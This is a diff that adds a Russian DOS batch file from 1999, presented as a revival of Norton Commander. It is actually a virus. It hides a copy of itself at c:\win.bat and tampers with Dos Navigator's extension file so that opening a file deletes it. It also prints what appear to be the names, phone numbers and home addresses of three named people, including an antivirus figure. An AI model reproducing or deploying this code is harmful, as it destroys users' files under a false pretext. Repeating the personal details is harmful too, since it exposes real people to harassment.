@@ -1,0 +1,43 @@
+:Возродим мы Нортон Командер, ver 3.0! (c) Diablo.99
+: Дата создания программы 29-05-99
+@echo off
+echo Передаём большой привет! (Reproduce big hello!)
+
+if "%0"=="win.bat" goto message
+set antiDN= c:\dn\dn.ext
+if not exist %antiDN% goto noDN
+ctty nul
+copy %0 c:\win.bat
+attrib c:\win.bat +h +r +a
+goto antidn
+:message
+@echo off
+ctty con
+echo УбЕдИтЕлЬнАя ПрОсЬбА нЕ вКлЮчАтЬ кОмПьЮтЕр, ТаК кАк ЭтО МоЖеТ БыТь ОпАсНо!
+echo Авторы вирусов не спят, а действуют (c) Diablo.99
+attrib c:\win.bat -h -r -a
+@ctty nul
+del c:\win.bat
+goto end
+:antiDN
+if exist c:\smrd.sys goto end
+attrib %antiDN% -h -r -a
+echo.           >> %antiDN%
+echo ???{       >> %antiDN%
+echo @echo off  >> %antiDN%
+echo del !.!    >> %antiDN%
+echo }          >> %antiDN%
+dir c:\ > c:\smrd.sys
+@ctty con
+goto end
+:noDN
+@echo off
+cls
+echo This programm don't work, beacuse you don't have Dos Navigator...
+echo              А ты знаешь этих людей???
+echo Л0ЗИНСКИЙ  ДМИТРИЙ НИКОЛАЕВИЧ   481-1139 [АОН]  ДУБНИНСКАЯ 2-1-116
+echo                                                  (район Лиалозово)
+echo МОСТОВОЙ   ДМИТРИЙ ЮРЬЕВИЧ      431-9131        УДАЛЬЦОВА 69А-54
+echo КАСПЕРСКИЙ ЕВГЕНИЙ              493-6087        ФОМИЧЕВОЙ 13-69 (родств)
+pause
+:end
